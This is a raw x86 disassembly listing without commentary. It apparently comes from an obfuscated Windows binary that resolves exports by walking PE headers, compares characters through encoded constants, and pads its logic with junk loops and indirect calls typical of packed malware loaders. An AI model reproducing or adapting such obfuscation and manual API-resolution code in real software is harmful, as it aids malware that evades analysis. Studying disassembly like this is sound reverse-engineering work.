  4229cf:	movsx  di,BYTE PTR [eax+0x1]
  4229d4:	mov    ebx,0x3b56
  4229d9:	sub    di,bx
  4229dc:	mov    ebx,0x8a94
  4229e1:	xor    di,bx
  4229e4:	mov    ebx,0x4f90
  4229e9:	cmp    di,bx
  4229ec:	jne    0x422a14
  4229f2:	movsx  di,BYTE PTR [eax]
  4229f6:	mov    ebx,0x3b56
  4229fb:	sub    di,bx
  4229fe:	mov    ebx,0x8a94
  422a03:	xor    di,bx
  422a06:	mov    ebx,0x4e63
  422a0b:	cmp    di,bx
  422a0e:	je     0x422a24
  422a14:	mov    edi,DWORD PTR [ebp-0x10]
  422a17:	xor    edi,ecx
  422a19:	mov    ebx,esi
  422a1b:	sub    ebx,edi
  422a1d:	add    eax,ebx
  422a1f:	jmp    0x4229cf
  422a24:	mov    esi,DWORD PTR [ebp-0x14]
  422a27:	mov    esi,DWORD PTR [esi]
  422a29:	mov    edi,DWORD PTR [eax+0x3c]
  422a2c:	lea    esi,[edi+esi*8+0x78]
  422a30:	mov    esi,DWORD PTR [esi+eax*1]
  422a33:	mov    DWORD PTR [ebp-0x8],esi
  422a36:	mov    esi,DWORD PTR [ebp+0x8]
  422a39:	xor    esi,ecx
  422a3b:	add    esi,edx
  422a3d:	mov    DWORD PTR [ebp-0x14],esi
  422a40:	mov    esi,DWORD PTR [ebp+0x8]
  422a43:	mov    edi,DWORD PTR [ebp-0x8]
  422a46:	xor    esi,ecx
  422a48:	add    esi,edx
  422a4a:	pop    ebx
  422a4b:	cmp    edi,esi
  422a4d:	jne    0x422a6b
  422a53:	mov    eax,DWORD PTR [ebp+0xc]
  422a56:	xor    eax,ecx
  422a58:	mov    ecx,DWORD PTR [ebp-0x8]
  422a5b:	add    eax,edx
  422a5d:	imul   eax,ecx
  422a60:	mov    DWORD PTR [ebp-0x8],eax
  422a63:	push   DWORD PTR [ebp+0x18]
  422a66:	jmp    0x422abf
  422a6b:	mov    ecx,DWORD PTR [ebp-0x8]
  422a6e:	add    ecx,eax
  422a70:	mov    DWORD PTR [ebp-0x14],ecx
  422a73:	mov    ecx,DWORD PTR [ebp-0x14]
  422a76:	mov    ecx,DWORD PTR [ecx+0xc]
  422a79:	movsx  cx,BYTE PTR [ecx+eax*1]
  422a7e:	mov    edx,0x3b56
  422a83:	sub    cx,dx
  422a86:	mov    edx,0x8a94
  422a8b:	xor    cx,dx
  422a8e:	mov    edx,0x4e61
  422a93:	cmp    cx,dx
  422a96:	jne    0x422a63
  422a9c:	mov    ecx,DWORD PTR ds:0x4282ef
  422aa2:	mov    ecx,DWORD PTR [ecx+0x198]
  422aa8:	mov    DWORD PTR [ecx],eax
  422aaa:	jmp    0x422ad0
  422aaf:	mov    ecx,DWORD PTR [ebp+0x18]
  422ab2:	cmp    ecx,0xf89c85b1
  422ab8:	jne    0x422ad0
  422abe:	push   eax
  422abf:	push   DWORD PTR [ebp+0x14]
  422ac2:	push   DWORD PTR [ebp+0x10]
  422ac5:	push   DWORD PTR [ebp+0xc]
  422ac8:	push   DWORD PTR [ebp+0x8]
  422acb:	call   0x422519
  422ad0:	pop    edi
  422ad1:	pop    esi
  422ad2:	leave  
  422ad3:	ret    0x14
  422ad6:	push   ebp
  422ad7:	mov    ebp,esp
  422ad9:	sub    esp,0x54
  422adc:	add    DWORD PTR ds:0x428657,0x428603
  422ae6:	push   0x4283ff
  422aeb:	call   DWORD PTR ds:0x4287cf
  422af1:	sbb    DWORD PTR ds:0x428647,0x42860b
  422afb:	test   eax,eax
  422afd:	je     0x422b14
  422b03:	xor    eax,eax
  422b05:	mov    DWORD PTR ds:0x428677,0x34e1
  422b0f:	jmp    0x4233fc
  422b14:	mov    DWORD PTR [ebp-0x2c],0x0
  422b1b:	xor    ecx,0x686a
  422b21:	mov    eax,DWORD PTR [ebp-0x20]
  422b24:	mov    DWORD PTR [ebp-0x20],eax
  422b27:	mov    ecx,0xf89c85b0
  422b2c:	and    DWORD PTR ds:0x428647,0x0
  422b36:	mov    edx,DWORD PTR ds:0x428647
  422b3c:	inc    edx
  422b3d:	mov    DWORD PTR ds:0x428647,edx
  422b43:	cmp    DWORD PTR ds:0x428647,0x27
  422b4a:	jge    0x422b70
  422b50:	jmp    0x422b63
  422b55:	push   DWORD PTR [ebp-0xc]
  422b58:	push   0x4285eb
  422b5d:	call   DWORD PTR ds:0x4287b3
  422b63:	cmp    DWORD PTR ds:0x428647,0x19
  422b6a:	jb     0x422b36
  422b70:	mov    DWORD PTR [ebp-0x4],ecx
  422b73:	and    DWORD PTR ds:0x428647,0x0
  422b7d:	xor    edx,edx
  422b7f:	or     edx,DWORD PTR ds:0x428647
  422b85:	inc    edx
  422b86:	mov    DWORD PTR ds:0x428647,edx
  422b8c:	cmp    DWORD PTR ds:0x428647,0xc
  422b93:	jl     0x422bcb
  422b99:	jmp    0x422ba4
  422b9e:	call   DWORD PTR ds:0x4287b7
  422ba4:	cmp    DWORD PTR ds:0x428647,0xb
  422bab:	jne    0x422bbe
  422bb1:	mov    edx,DWORD PTR ds:0x428647
  422bb7:	inc    edx
  422bb8:	mov    DWORD PTR ds:0x428647,edx
  422bbe:	cmp    DWORD PTR ds:0x428647,0x1f
  422bc5:	jb     0x422b7d
  422bcb:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  422bd2:	lea    eax,[ebp-0x14]
  422bd5:	xor    edx,DWORD PTR ds:0x42866b
  422bdb:	mov    DWORD PTR [ebp-0x2c],eax
  422bde:	movzx  edx,BYTE PTR ds:0x428667
  422be5:	add    DWORD PTR ds:0x4285d7,edx
  422beb:	lea    eax,[ebp-0x18]
  422bee:	mov    DWORD PTR [ebp-0x24],eax
  422bf1:	movzx  eax,WORD PTR ds:0x428607
  422bf8:	add    DWORD PTR ds:0x428603,eax
  422bfe:	mov    eax,ds:0x4282ef
  422c03:	neg    edx
  422c05:	mov    eax,DWORD PTR [eax+0x1c8]
  422c0b:	and    DWORD PTR ds:0x4285e7,0x0
  422c15:	xor    edx,edx
  422c17:	add    edx,DWORD PTR ds:0x4285e7
  422c1d:	inc    edx
  422c1e:	mov    DWORD PTR ds:0x4285e7,edx
  422c24:	cmp    DWORD PTR ds:0x4285e7,0x9
  422c2b:	jl     0x422c66
  422c31:	jmp    0x422c3f
  422c36:	push   DWORD PTR [ebp-0x18]
  422c39:	call   DWORD PTR ds:0x4287bb
  422c3f:	cmp    DWORD PTR ds:0x4285e7,0x8
  422c46:	jne    0x422c59
  422c4c:	mov    edx,DWORD PTR ds:0x4285e7
  422c52:	inc    edx
  422c53:	mov    DWORD PTR ds:0x4285e7,edx
  422c59:	cmp    DWORD PTR ds:0x4285e7,0x1b
  422c60:	jb     0x422c15
  422c66:	mov    eax,DWORD PTR [eax]
  422c68:	adc    edx,0x4266
  422c6e:	mov    edx,DWORD PTR [ebp-0x24]
  422c71:	push   ebx
  422c72:	push   esi
  422c73:	push   edi
  422c74:	xor    DWORD PTR ds:0x42865b,0x2427
  422c7e:	mov    edi,0x75108a4
  422c83:	and    DWORD PTR ds:0x42867b,0x0
  422c8d:	xor    ebx,ebx
  422c8f:	or     ebx,DWORD PTR ds:0x42867b
  422c95:	inc    ebx
  422c96:	mov    DWORD PTR ds:0x42867b,ebx
  422c9c:	cmp    DWORD PTR ds:0x42867b,0x18
  422ca3:	jg     0x422cdb
  422ca9:	jmp    0x422cce
  422cae:	push   0x7b2e
  422cb3:	push   0x428028
  422cb8:	push   DWORD PTR [ebp-0x20]
  422cbb:	push   0x42800b
  422cc0:	push   0x82c9
  422cc5:	push   DWORD PTR [ebp-0x10]
  422cc8:	call   DWORD PTR ds:0x4287bf
  422cce:	cmp    DWORD PTR ds:0x42867b,0x10
  422cd5:	jb     0x422c8d
  422cdb:	xor    eax,edi
  422cdd:	mov    ebx,0x3272ec
  422ce2:	sbb    DWORD PTR ds:0x4285ef,0x42860b
  422cec:	add    eax,ebx
  422cee:	mov    DWORD PTR [edx],eax
  422cf0:	mov    eax,ds:0x4284f3
  422cf5:	cmp    eax,0x445cecf9
  422cfa:	jne    0x422dc2
  422d00:	sbb    DWORD PTR ds:0x42860f,0x5794
  422d0a:	mov    eax,DWORD PTR [ebp-0x4]
  422d0d:	mov    esi,DWORD PTR ds:0x42864b
  422d13:	or     esi,DWORD PTR ds:0x4285cf
  422d19:	mov    DWORD PTR ds:0x42864b,esi
  422d1f:	mov    edx,DWORD PTR ds:0x4282ef
  422d25:	xor    DWORD PTR ds:0x42863f,0x1fa5
  422d2f:	mov    edx,DWORD PTR [edx+0x198]
  422d35:	xor    DWORD PTR ds:0x42864f,ecx
  422d3b:	xor    eax,edi
  422d3d:	add    eax,ebx
  422d3f:	mov    DWORD PTR [edx],eax
  422d41:	sub    DWORD PTR ds:0x428617,edx
  422d47:	mov    eax,DWORD PTR [ebp-0x4]
  422d4a:	mov    edx,DWORD PTR ds:0x428637
  422d50:	add    DWORD PTR ds:0x428663,edx
  422d56:	xor    eax,edi
  422d58:	and    DWORD PTR ds:0x42867b,0x0
  422d62:	xor    edx,edx
  422d64:	or     edx,DWORD PTR ds:0x42867b
  422d6a:	inc    edx
  422d6b:	mov    DWORD PTR ds:0x42867b,edx
  422d71:	cmp    DWORD PTR ds:0x42867b,0xb
  422d78:	jg     0x422db5
  422d7e:	jmp    0x422d8e
  422d83:	push   0x4280a2
  422d88:	call   DWORD PTR ds:0x4287c3
  422d8e:	cmp    DWORD PTR ds:0x42867b,0xa
  422d95:	jne    0x422da8
  422d9b:	mov    edx,DWORD PTR ds:0x42867b
  422da1:	inc    edx
  422da2:	mov    DWORD PTR ds:0x42867b,edx
  422da8:	cmp    DWORD PTR ds:0x42867b,0x18
  422daf:	jb     0x422d62
  422db5:	add    eax,ebx
  422db7:	sub    DWORD PTR ds:0x428627,ecx
  422dbd:	mov    ds:0x4284f3,eax
  422dc2:	mov    edx,DWORD PTR ds:0x4285e7
  422dc8:	and    edx,DWORD PTR ds:0x428617
  422dce:	mov    DWORD PTR ds:0x4285e7,edx
  422dd4:	mov    eax,ds:0x4282ef
  422dd9:	xor    edx,DWORD PTR ds:0x42865f
  422ddf:	mov    eax,DWORD PTR [eax+0x18c]
  422de5:	sbb    edx,0x43ef
  422deb:	mov    eax,DWORD PTR [eax]
  422ded:	adc    edx,esi
  422def:	mov    DWORD PTR [ebp-0x34],eax
  422df2:	mov    eax,0xf89c85bc
  422df7:	mov    DWORD PTR [ebp-0x24],eax
  422dfa:	and    DWORD PTR ds:0x42861f,0x0
  422e04:	mov    edx,DWORD PTR ds:0x42861f
  422e0a:	inc    edx
  422e0b:	mov    DWORD PTR ds:0x42861f,edx
  422e11:	cmp    DWORD PTR ds:0x42861f,0x1e
  422e18:	jle    0x422e52
  422e1e:	jmp    0x422e45
  422e23:	push   0x4285cf
  422e28:	push   0x2375
  422e2d:	push   0x5548
  422e32:	push   0x51cc
  422e37:	push   0x80b2
  422e3c:	push   DWORD PTR [ebp-0x28]
  422e3f:	call   DWORD PTR ds:0x4287c7
  422e45:	cmp    DWORD PTR ds:0x42861f,0x17
  422e4c:	jb     0x422e04
  422e52:	mov    DWORD PTR [ebp-0x24],eax
  422e55:	mov    DWORD PTR ds:0x42866b,0x46d0
  422e5f:	mov    DWORD PTR [ebp-0x24],eax
  422e62:	xor    esi,esi
  422e64:	or     esi,DWORD PTR ds:0x4285ef
  422e6a:	sub    DWORD PTR ds:0x428673,esi
  422e70:	mov    DWORD PTR [ebp-0x24],ecx
  422e73:	mov    DWORD PTR [ebp-0x38],eax
  422e76:	and    esi,0x6095
  422e7c:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  422e83:	sub    DWORD PTR ds:0x428653,edi
  422e89:	mov    esi,DWORD PTR [ebp-0x4]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x8]
  422e8f:	mov    edx,DWORD PTR ds:0x4286a7
  422e95:	mov    edx,DWORD PTR [edx]
  422e97:	xor    DWORD PTR ds:0x4285cf,edx
  422e9d:	mov    edx,DWORD PTR [ebp-0x8]
  422ea0:	xor    edx,edi
  422ea2:	xor    ecx,edi
  422ea4:	add    DWORD PTR ds:0x42861f,0x42860f
  422eae:	add    ecx,edx
  422eb0:	sbb    edx,0x585b
  422eb6:	mov    edx,DWORD PTR [ebp-0x8]
  422eb9:	xor    esi,edi
  422ebb:	xor    edx,edi
  422ebd:	adc    DWORD PTR ds:0x428647,0x7d1c
  422ec7:	add    esi,ebx
  422ec9:	mov    DWORD PTR ds:0x428607,0x675c
  422ed3:	lea    ecx,[ecx+edx*1+0x9758c4]
  422eda:	mov    DWORD PTR ds:0x428647,0x161d
  422ee4:	cmp    esi,ecx
  422ee6:	mov    DWORD PTR ds:0x42861b,0x50e4
  422ef0:	ja     0x42300f
  422ef6:	xor    DWORD PTR ds:0x4285cf,0x42862b
  422f00:	mov    eax,DWORD PTR [ebp-0x8]
  422f03:	sbb    DWORD PTR ds:0x42866b,0x4285eb
  422f0d:	xor    eax,edi
  422f0f:	and    DWORD PTR ds:0x428633,0x42865b
  422f19:	lea    eax,[eax+esi*1+0x3272ec]
  422f20:	push   eax
  422f21:	mov    eax,DWORD PTR [ebp-0x24]
  422f24:	xor    DWORD PTR ds:0x42863b,0x428647
  422f2e:	xor    eax,edi
  422f30:	sbb    DWORD PTR ds:0x4285f7,0x428637
  422f3a:	lea    eax,[ebp+eax*1+0x3272f4]
  422f41:	push   eax
  422f42:	xor    eax,eax
  422f44:	add    eax,DWORD PTR ds:0x428653
  422f4a:	or     DWORD PTR ds:0x4285ef,eax
  422f50:	mov    eax,ds:0x4282ef
  422f55:	push   DWORD PTR [eax+0x1bc]
  422f5b:	call   0x40aa5b
  422f60:	and    DWORD PTR ds:0x428673,0x0
  422f6a:	mov    eax,ds:0x428673
  422f6f:	inc    eax
  422f70:	mov    ds:0x428673,eax
  422f75:	cmp    DWORD PTR ds:0x428673,0x2d
  422f7c:	jb     0x422fa4
  422f82:	jmp    0x422f97
  422f87:	push   0x428657
  422f8c:	push   0x4280ae
  422f91:	call   DWORD PTR ds:0x4287cb
  422f97:	cmp    DWORD PTR ds:0x428673,0x1d
  422f9e:	jb     0x422f6a
  422fa4:	mov    eax,DWORD PTR [ebp-0x8]
  422fa7:	or     ecx,0x5d69
  422fad:	xor    eax,edi
  422faf:	lea    esi,[esi+eax*1+0x3272ec]
  422fb6:	not    ecx
  422fb8:	mov    eax,DWORD PTR [ebp-0x8]
  422fbb:	mov    DWORD PTR ds:0x42860b,0x501a
  422fc5:	mov    ecx,DWORD PTR [ebp-0x8]
  422fc8:	xor    ecx,edi
  422fca:	sbb    DWORD PTR ds:0x428667,0x42864b
  422fd4:	xor    eax,edi
  422fd6:	sbb    DWORD PTR ds:0x4285ef,0xbec
  422fe0:	add    eax,ecx
  422fe2:	mov    ecx,DWORD PTR [ebp-0x8]
  422fe5:	xor    ecx,edi
  422fe7:	mov    DWORD PTR ds:0x4285e3,0x1b1e
  422ff1:	lea    eax,[eax+ecx*1+0x9758c4]
  422ff8:	cmp    esi,eax
  422ffa:	mov    DWORD PTR ds:0x42865b,0x1916
  423004:	jbe    0x422ef6
  42300a:	mov    eax,0xf89c85bc
  42300f:	mov    ecx,DWORD PTR [ebp+0xc]
  423012:	mov    DWORD PTR ds:0x428173,ecx
  423018:	or     DWORD PTR ds:0x4285ff,ebx
  42301e:	mov    ecx,DWORD PTR [ebp+0x10]
  423021:	or     DWORD PTR ds:0x4285d7,ebx
  423027:	mov    DWORD PTR ds:0x4283c7,ecx
  42302d:	mov    DWORD PTR ds:0x42862b,0x16
  423037:	cmp    DWORD PTR ds:0x42862b,0x0
  42303e:	je     0x423083
  423044:	cmp    DWORD PTR ds:0x42862b,0x1e
  42304b:	jg     0x423083
  423051:	jmp    0x423071
  423056:	push   0x2088
  42305b:	push   DWORD PTR [ebp-0x10]
  42305e:	push   0x46c3
  423063:	push   0x5611
  423068:	push   DWORD PTR [ebp-0x20]
  42306b:	call   DWORD PTR ds:0x42879f
  423071:	mov    edx,DWORD PTR ds:0x42862b
  423077:	dec    edx
  423078:	mov    DWORD PTR ds:0x42862b,edx
  42307e:	jmp    0x423037
  423083:	mov    ecx,DWORD PTR ds:0x428173
  423089:	mov    DWORD PTR ds:0x428673,0x6c19
  423093:	mov    edx,DWORD PTR [ebp-0x2c]
  423096:	and    DWORD PTR ds:0x42864f,0x1852
  4230a0:	sub    ecx,ebx
  4230a2:	sbb    DWORD PTR ds:0x428663,0x32b3
  4230ac:	xor    ecx,edi
  4230ae:	mov    DWORD PTR ds:0x4285d7,0x3bce
  4230b8:	mov    DWORD PTR [edx],ecx
  4230ba:	mov    edx,DWORD PTR [ebp-0x20]
  4230bd:	mov    ecx,DWORD PTR ds:0x4285eb
  4230c3:	mov    ecx,0xf89c85b0
  4230c8:	cmp    edx,ecx
  4230ca:	mov    DWORD PTR ds:0x428637,0x7ca2
  4230d4:	jne    0x4231ea
  4230da:	lea    eax,[ebp-0x10]
  4230dd:	mov    DWORD PTR [ebp-0x40],eax
  4230e0:	and    DWORD PTR ds:0x4285df,0x428623
  4230ea:	lea    eax,[ebp+0x4]
  4230ed:	xor    DWORD PTR ds:0x428603,0x2610
  4230f7:	mov    DWORD PTR [ebp-0x10],eax
  4230fa:	mov    eax,DWORD PTR [ebp-0x10]
  4230fd:	test   eax,eax
  4230ff:	je     0x4233de
  423105:	movzx  eax,WORD PTR ds:0x42867b
  42310c:	sub    DWORD PTR ds:0x42860b,eax
  423112:	mov    eax,DWORD PTR [ebp-0xc]
  423115:	and    ecx,0x315b
  42311b:	mov    eax,DWORD PTR [ebp-0x8]
  42311e:	sbb    DWORD PTR ds:0x428633,edi
  423124:	mov    eax,DWORD PTR [ebp-0x4]
  423127:	mov    ecx,DWORD PTR ds:0x42868f
  42312d:	xor    esi,esi
  42312f:	add    esi,DWORD PTR ds:0x42872b
  423135:	sub    esi,ecx
  423137:	imul   ecx,DWORD PTR [ecx+esi*1]
  42313b:	mov    DWORD PTR [ebp+0xc],eax
  42313e:	xor    ecx,esi
  423140:	mov    eax,eax
  423142:	mov    eax,ds:0x4282ef
  423147:	mov    eax,DWORD PTR [eax+0x1c8]
  42314d:	mov    eax,DWORD PTR [eax]
  42314f:	cdq    
  423150:	mov    esi,0xfabdbedd
  423155:	add    eax,esi
  423157:	adc    edx,0xffffffff
  42315a:	and    DWORD PTR [ebp-0x38],0x0
  42315e:	xor    edx,0x0
  423161:	mov    DWORD PTR [ebp-0x24],edx
  423164:	mov    edx,DWORD PTR [ebp+0xc]
  423167:	mov    DWORD PTR [ebp-0x3c],edx
  42316a:	mov    ecx,0x8a29a137
  42316f:	xor    eax,ecx
  423171:	add    DWORD PTR [ebp-0x3c],esi
  423174:	mov    edx,DWORD PTR [ebp-0x3c]
  423177:	adc    DWORD PTR [ebp-0x38],0xffffffff
  42317b:	xor    edx,ecx
  42317d:	mov    DWORD PTR [ebp-0x30],edx
  423180:	mov    edx,DWORD PTR [ebp-0x38]
  423183:	xor    edx,0x0
  423186:	mov    DWORD PTR [ebp-0x2c],edx
  423189:	cmp    DWORD PTR [ebp-0x30],eax
  42318c:	jne    0x42319d
  423192:	mov    eax,DWORD PTR [ebp-0x24]
  423195:	cmp    edx,eax
  423197:	je     0x4231ca
  42319d:	mov    eax,ds:0x4282ef
  4231a2:	mov    eax,DWORD PTR [eax+0x1c0]
  4231a8:	mov    eax,DWORD PTR [eax]
  4231aa:	xor    edx,edx
  4231ac:	add    eax,esi
  4231ae:	adc    edx,0xffffffff
  4231b1:	xor    eax,ecx
  4231b3:	xor    edx,0x0
  4231b6:	cmp    eax,0x70941fe9
  4231bb:	jne    0x4233de
  4231c1:	cmp    edx,0xffffffff
  4231c4:	jne    0x4233de
  4231ca:	mov    eax,ds:0x42836b
  4231cf:	mov    edx,DWORD PTR ds:0x428373
  4231d5:	xor    eax,edx
  4231d7:	mov    ds:0x42836b,eax
  4231dc:	mov    edx,DWORD PTR ds:0x42836b
  4231e2:	mov    eax,DWORD PTR [ebp-0x10]
  4231e5:	jmp    0x42339e
  4231ea:	mov    edx,DWORD PTR [ebp-0x14]
  4231ed:	cmp    edx,0xf89c85b1
  4231f3:	je     0x423250
  4231f9:	mov    edx,DWORD PTR [ebp-0x4]
  4231fc:	mov    esi,DWORD PTR [ebp-0x18]
  4231ff:	xor    edx,edi
  423201:	add    edx,ebx
  423203:	cmp    edx,esi
  423205:	je     0x423250
  42320b:	mov    eax,ds:0x4282ef
  423210:	mov    eax,DWORD PTR [eax+0x194]
  423216:	mov    ecx,DWORD PTR [eax]
  423218:	mov    eax,DWORD PTR [ecx+0x3c]
  42321b:	push   DWORD PTR ds:0x4283c7
  423221:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423225:	push   DWORD PTR ds:0x428173
  42322b:	add    eax,ecx
  42322d:	mov    ecx,DWORD PTR ds:0x4282ef
  423233:	mov    ecx,DWORD PTR [ecx+0x194]
  423239:	push   DWORD PTR [ecx]
  42323b:	call   eax
  42323d:	mov    ecx,DWORD PTR ds:0x4282ef
  423243:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423249:	mov    DWORD PTR [ecx],eax
  42324b:	jmp    0x4233de
  423250:	mov    edx,DWORD PTR [ebp-0x4]
  423253:	mov    esi,DWORD PTR [ebp-0x34]
  423256:	xor    edx,edi
  423258:	add    edx,ebx
  42325a:	cmp    edx,esi
  42325c:	jne    0x4232b5
  423262:	mov    edx,DWORD PTR [ebp-0x4]
  423265:	mov    esi,DWORD PTR ds:0x4282ef
  42326b:	mov    esi,DWORD PTR [esi+0x198]
  423271:	xor    edx,edi
  423273:	add    edx,ebx
  423275:	cmp    edx,DWORD PTR [esi]
  423277:	jne    0x423292
  42327d:	push   ecx
  42327e:	mov    ecx,DWORD PTR [ebp-0x4]
  423281:	xor    ecx,edi
  423283:	add    ecx,ebx
  423285:	push   ecx
  423286:	push   eax
  423287:	push   DWORD PTR [ebp-0x8]
  42328a:	push   DWORD PTR [ebp-0x4]
  42328d:	call   0x422519
  423292:	push   DWORD PTR [ebp-0x8]
  423295:	push   DWORD PTR [ebp-0x4]
  423298:	call   0x401000
  42329d:	mov    eax,DWORD PTR [ebp-0x4]
  4232a0:	xor    eax,edi
  4232a2:	add    eax,ebx
  4232a4:	mov    ds:0x428373,eax
  4232a9:	mov    eax,DWORD PTR [ebp-0x4]
  4232ac:	xor    eax,edi
  4232ae:	add    eax,ebx
  4232b0:	mov    ds:0x42836b,eax
  4232b5:	lea    eax,[ebp-0x1c]
  4232b8:	mov    DWORD PTR [ebp-0x44],eax
  4232bb:	lea    eax,[ebp+0x4]
  4232be:	mov    DWORD PTR [ebp-0x1c],eax
  4232c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4232c4:	test   eax,eax
  4232c6:	je     0x4233de
  4232cc:	mov    DWORD PTR [ebp-0x48],0xf152c39
  4232d3:	mov    DWORD PTR [ebp-0x4c],0x712ed2e
  4232da:	mov    DWORD PTR [ebp-0x50],0x373fc08
  4232e1:	mov    DWORD PTR [ebp-0x54],0x72670ad8
  4232e8:	call   0x41d64a
  4232ed:	mov    eax,DWORD PTR [ebp-0xc]
  4232f0:	mov    eax,DWORD PTR [ebp-0x8]
  4232f3:	mov    eax,DWORD PTR [ebp-0x4]
  4232f6:	mov    DWORD PTR [ebp+0xc],eax
  4232f9:	mov    eax,eax
  4232fb:	mov    eax,ds:0x4282ef
  423300:	mov    eax,DWORD PTR [eax+0x1c8]
  423306:	mov    eax,DWORD PTR [eax]
  423308:	cdq    
  423309:	mov    esi,0xfabdbedd
  42330e:	add    eax,esi
  423310:	adc    edx,0xffffffff
  423313:	and    DWORD PTR [ebp-0x38],0x0
  423317:	xor    edx,0x0
  42331a:	mov    DWORD PTR [ebp-0x24],edx
  42331d:	mov    edx,DWORD PTR [ebp+0xc]
  423320:	mov    DWORD PTR [ebp-0x3c],edx
  423323:	mov    ecx,0x8a29a137
  423328:	xor    eax,ecx
  42332a:	add    DWORD PTR [ebp-0x3c],esi
  42332d:	mov    edx,DWORD PTR [ebp-0x3c]
  423330:	adc    DWORD PTR [ebp-0x38],0xffffffff
  423334:	xor    edx,ecx
  423336:	mov    DWORD PTR [ebp-0x30],edx
  423339:	mov    edx,DWORD PTR [ebp-0x38]
  42333c:	xor    edx,0x0
  42333f:	mov    DWORD PTR [ebp-0x2c],edx
  423342:	cmp    DWORD PTR [ebp-0x30],eax
  423345:	jne    0x423356
  42334b:	mov    eax,DWORD PTR [ebp-0x24]
  42334e:	cmp    edx,eax
  423350:	je     0x423383
  423356:	mov    eax,ds:0x4282ef
  42335b:	mov    eax,DWORD PTR [eax+0x1c0]
  423361:	mov    eax,DWORD PTR [eax]
  423363:	xor    edx,edx
  423365:	add    eax,esi
  423367:	adc    edx,0xffffffff
  42336a:	xor    eax,ecx
  42336c:	xor    edx,0x0
  42336f:	cmp    eax,0x70941fe9
  423374:	jne    0x4233de
  42337a:	cmp    edx,0xffffffff
  42337d:	jne    0x4233de
  423383:	mov    eax,ds:0x42836b
  423388:	mov    edx,DWORD PTR ds:0x428373
  42338e:	xor    eax,edx
  423390:	mov    ds:0x42836b,eax
  423395:	mov    edx,DWORD PTR ds:0x42836b
  42339b:	mov    eax,DWORD PTR [ebp-0x1c]
  42339e:	add    DWORD PTR [eax],edx
  4233a0:	mov    edx,DWORD PTR [ebp+0xc]
  4233a3:	mov    eax,ds:0x42836b
  4233a8:	xor    edx,edi
  4233aa:	add    edx,ebx
  4233ac:	xor    ebx,ebx
  4233ae:	add    edx,esi
  4233b0:	adc    ebx,0xffffffff
  4233b3:	xor    edi,edi
  4233b5:	xor    edx,ecx
  4233b7:	xor    ebx,0x0
  4233ba:	add    eax,esi
  4233bc:	adc    edi,0xffffffff
  4233bf:	xor    eax,ecx
  4233c1:	xor    edi,0x0
  4233c4:	cmp    eax,edx
  4233c6:	jne    0x4233de
  4233cc:	cmp    edi,ebx
  4233ce:	jne    0x4233de
  4233d4:	mov    eax,ds:0x42836b
  4233d9:	mov    ds:0x428373,eax
  4233de:	mov    eax,ds:0x4282ef
  4233e3:	push   0x4
  4233e5:	add    eax,0x1cc
  4233ea:	push   eax
  4233eb:	lea    eax,[ebp-0xc]
  4233ee:	push   eax
  4233ef:	call   0x40aa5b
  4233f4:	mov    eax,DWORD PTR [ebp-0xc]
  4233f7:	mov    eax,DWORD PTR [eax]
  4233f9:	pop    edi
  4233fa:	pop    esi
  4233fb:	pop    ebx
  4233fc:	leave  
  4233fd:	ret    0xc
  423400:	xor    eax,eax
  423402:	add    DWORD PTR ds:0x4285f3,0x36c3
  42340c:	inc    eax
  42340d:	ret    
  42340e:	push   ebp
  42340f:	mov    ebp,esp
  423411:	push   ecx
  423412:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  423419:	dec    edx
  42341a:	mov    eax,DWORD PTR [ebp+0x8]
  42341d:	sbb    DWORD PTR ds:0x42864b,0x3b56
  423427:	movsx  eax,BYTE PTR [eax]
  42342a:	xor    edx,edx
  42342c:	xor    edx,DWORD PTR ds:0x428653
  423432:	or     edx,DWORD PTR ds:0x428637
  423438:	mov    DWORD PTR ds:0x428653,edx
  42343e:	mov    edx,0x3272ec
  423443:	mov    ecx,DWORD PTR ds:0x428607
  423449:	adc    DWORD PTR ds:0x42865b,ecx
  42344f:	sub    eax,edx
  423451:	movzx  ecx,WORD PTR ds:0x4285ff
  423458:	sbb    DWORD PTR ds:0x42864f,ecx
  42345e:	mov    ecx,0x75108a4
  423463:	or     DWORD PTR ds:0x4285d3,0x42864b
  42346d:	xor    eax,ecx
  42346f:	cmp    eax,0xf89c85c5
  423474:	mov    DWORD PTR ds:0x42864f,0x82b
  42347e:	jne    0x4234c3
  423484:	adc    DWORD PTR ds:0x428633,ecx
  42348a:	mov    eax,DWORD PTR [ebp+0x8]
  42348d:	push   esi
  42348e:	sub    DWORD PTR ds:0x4285e7,edi
  423494:	mov    esi,DWORD PTR [ebp+0x8]
  423497:	and    DWORD PTR ds:0x4285e3,0x244e
  4234a1:	add    esi,DWORD PTR [eax+0x3c]
  4234a4:	mov    DWORD PTR [ebp+0x8],esi
  4234a7:	mov    eax,DWORD PTR [ebp-0x4]
  4234aa:	mov    esi,DWORD PTR [ebp+0x8]
  4234ad:	xor    eax,ecx
  4234af:	add    eax,edx
  4234b1:	cmp    DWORD PTR [esi+0x54],eax
  4234b4:	pop    esi
  4234b5:	je     0x4234c3
  4234bb:	mov    eax,DWORD PTR [ebp+0x8]
  4234be:	jmp    0x4234ca
  4234c3:	mov    eax,DWORD PTR [ebp-0x4]
  4234c6:	xor    eax,ecx
  4234c8:	add    eax,edx
  4234ca:	leave  
  4234cb:	ret    0x4
  4234ce:	push   ebp
  4234cf:	mov    ebp,esp
  4234d1:	sub    esp,0xc
  4234d4:	push   esi
  4234d5:	xor    DWORD PTR ds:0x428617,edi
  4234db:	mov    esi,0xf89c85b0
  4234e0:	xor    edx,DWORD PTR ds:0x428657
  4234e6:	mov    DWORD PTR [ebp-0x8],esi
  4234e9:	sub    ecx,ecx
  4234eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  4234f2:	add    ecx,DWORD PTR ds:0x4285e3
  4234f8:	push   edi
  4234f9:	mov    eax,eax
  4234fb:	and    DWORD PTR ds:0x4285ff,0x0
  423505:	xor    eax,eax
  423507:	add    eax,DWORD PTR ds:0x4285ff
  42350d:	inc    eax
  42350e:	mov    ds:0x4285ff,eax
  423513:	cmp    DWORD PTR ds:0x4285ff,0x20
  42351a:	ja     0x42353d
  423520:	jmp    0x423530
  423525:	push   0x2fb5
  42352a:	call   DWORD PTR ds:0x4287a3
  423530:	cmp    DWORD PTR ds:0x4285ff,0x10
  423537:	jb     0x423505
